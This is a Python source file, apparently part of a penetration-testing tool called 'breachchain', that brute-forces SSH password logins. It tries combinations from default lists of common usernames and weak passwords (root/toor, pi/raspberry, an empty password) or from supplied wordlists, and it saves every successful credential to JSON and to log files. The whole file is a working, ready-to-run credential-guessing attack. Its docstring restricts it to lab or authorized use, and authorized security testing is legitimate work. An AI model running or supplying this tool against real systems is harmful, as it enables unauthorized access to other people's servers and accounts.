"""SSH credential brute-forcing: given just an IP (and a port found by
recon.py), try a list of user/password combinations and report which ones
authenticate. This is the other missing "initial access" capability alongside
recon.py -- until now the tool assumed a valid account was already known.

Deliberately narrow scope: SSH password auth only, sequential-ish with a
small thread pool, a short default wordlist. Not a general-purpose brute
forcer (no rate-limit evasion, no other protocols) -- for a lab/test VM,
not for use against systems you don't own or have written authorization to test.
"""
from __future__ import annotations

import concurrent.futures
import logging
import socket
import sys
import time
from dataclasses import asdict, dataclass, field
from pathlib import Path

logger = logging.getLogger("breachchain")

DEFAULT_USERS = ["root", "admin", "ubuntu", "test", "user", "pi", "vagrant"]
DEFAULT_PASSWORDS = [
    "password", "123456", "admin", "root", "toor", "changeme",
    "password123", "qwerty", "letmein", "ubuntu", "raspberry", "",
]


@dataclass
class BruteForceHit:
    user: str
    password: str


@dataclass
class BruteForceResult:
    target: str
    port: int
    attempts: int
    hits: list[BruteForceHit] = field(default_factory=list)
    duration_s: float = 0.0

    def to_dict(self) -> dict:
        return {**asdict(self), "hits": [asdict(h) for h in self.hits]}


def _try_login(host: str, port: int, user: str, password: str, timeout: float) -> bool:
    import paramiko

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            hostname=host, port=port, username=user, password=password,
            timeout=timeout, banner_timeout=timeout, auth_timeout=timeout,
            look_for_keys=False, allow_agent=False,
        )
        return True
    except paramiko.AuthenticationException:
        return False
    except (paramiko.SSHException, socket.error, OSError):
        return False
    finally:
        client.close()


def brute_force_ssh(
    host: str,
    port: int = 22,
    users: list[str] | None = None,
    passwords: list[str] | None = None,
    timeout: float = 5.0,
    max_workers: int = 4,
    stop_on_first_hit: bool = False,
    log_attempts: bool = False,
) -> BruteForceResult:
    users = users or DEFAULT_USERS
    passwords = passwords or DEFAULT_PASSWORDS
    combos = [(u, p) for u in users for p in passwords]

    hits: list[BruteForceHit] = []
    t0 = time.monotonic()
    attempted = 0

    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as pool:
        futures = {pool.submit(_try_login, host, port, u, p, timeout): (u, p) for u, p in combos}
        for future in concurrent.futures.as_completed(futures):
            u, p = futures[future]
            attempted += 1
            try:
                ok = future.result()
            except Exception as e:
                ok = False
                if log_attempts:
                    logger.info(f"[{attempted}/{len(combos)}] {u!r}:{p!r} -> 오류: {e}")
                continue
            if log_attempts:
                logger.info(f"[{attempted}/{len(combos)}] {u!r}:{p!r} -> {'성공' if ok else '실패'}")
            if ok:
                hits.append(BruteForceHit(user=u, password=p))
                if stop_on_first_hit:
                    for f in futures:
                        f.cancel()
                    break

    return BruteForceResult(
        target=host, port=port, attempts=attempted, hits=hits,
        duration_s=round(time.monotonic() - t0, 3),
    )


def _setup_logging(log_path: Path) -> None:
    log_path.parent.mkdir(parents=True, exist_ok=True)
    logger.setLevel(logging.INFO)
    fmt = logging.Formatter("%(asctime)s [%(levelname)s] %(message)s", datefmt="%H:%M:%S")
    console = logging.StreamHandler(sys.stdout)
    console.setFormatter(fmt)
    logger.addHandler(console)
    file_handler = logging.FileHandler(log_path, encoding="utf-8")
    file_handler.setFormatter(fmt)
    logger.addHandler(file_handler)


def main() -> int:
    import argparse
    import json
    from datetime import datetime

    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8")

    parser = argparse.ArgumentParser(prog="breachchain-bruteforce")
    parser.add_argument("host")
    parser.add_argument("--port", type=int, default=22)
    parser.add_argument("--users", help="comma-separated usernames (default: built-in short list)")
    parser.add_argument("--passwords", help="comma-separated passwords (default: built-in short list)")
    parser.add_argument("--user-wordlist", type=Path, help="file with one username per line (overrides --users/default)")
    parser.add_argument("--password-wordlist", type=Path, help="file with one password per line (overrides --passwords/default)")
    parser.add_argument("--timeout", type=float, default=5.0)
    parser.add_argument("--workers", type=int, default=4)
    parser.add_argument("--stop-on-first-hit", action="store_true")
    parser.add_argument("--verbose", action="store_true", help="log every user:password attempt, not just the summary")
    parser.add_argument("--out", type=Path, default=Path(__file__).resolve().parents[2] / "runs" / "bruteforce.json")
    parser.add_argument("--log", type=Path, default=None, help="log file path (default: logs/bruteforce_YYMMDD_hhmmss.log)")
    args = parser.parse_args()

    log_path = args.log or Path(__file__).resolve().parents[2] / "logs" / f"bruteforce_{datetime.now().strftime('%y%m%d_%H%M%S')}.log"
    _setup_logging(log_path)

    def _load_lines(path: Path) -> list[str]:
        return path.read_text(encoding="utf-8").splitlines()

    if args.user_wordlist:
        users = [line for line in _load_lines(args.user_wordlist) if line]
    elif args.users:
        users = args.users.split(",")
    else:
        users = None

    if args.password_wordlist:
        passwords = _load_lines(args.password_wordlist)  # keep blank lines: an empty password is a valid guess
    elif args.passwords:
        passwords = args.passwords.split(",")
    else:
        passwords = None

    logger.info(f"SSH 브루트포싱 시작: {args.host}:{args.port} ({len(users or DEFAULT_USERS)}명 x {len(passwords or DEFAULT_PASSWORDS)}개 비밀번호, {len(users or DEFAULT_USERS) * len(passwords or DEFAULT_PASSWORDS)}개 조합)")
    logger.info(f"사용자 목록: {users or DEFAULT_USERS}")
    logger.info(f"비밀번호 목록: {[p if p else '(빈 비밀번호)' for p in (passwords or DEFAULT_PASSWORDS)]}")
    result = brute_force_ssh(
        args.host, args.port, users, passwords,
        timeout=args.timeout, max_workers=args.workers, stop_on_first_hit=args.stop_on_first_hit,
        log_attempts=args.verbose,
    )

    logger.info(f"시도 {result.attempts}회, {result.duration_s}s 소요")
    if result.hits:
        logger.info(f"성공한 자격정보 {len(result.hits)}개:")
        for h in result.hits:
            logger.info(f"  {h.user} : {h.password!r}")
    else:
        logger.info("성공한 자격정보 없음")

    args.out.parent.mkdir(parents=True, exist_ok=True)
    args.out.write_text(json.dumps(result.to_dict(), indent=2, ensure_ascii=False), encoding="utf-8")
    logger.info(f"저장: {args.out}")
    logger.info(f"로그 파일: {log_path}")
    return 0 if result.hits else 1


if __name__ == "__main__":
    raise SystemExit(main())
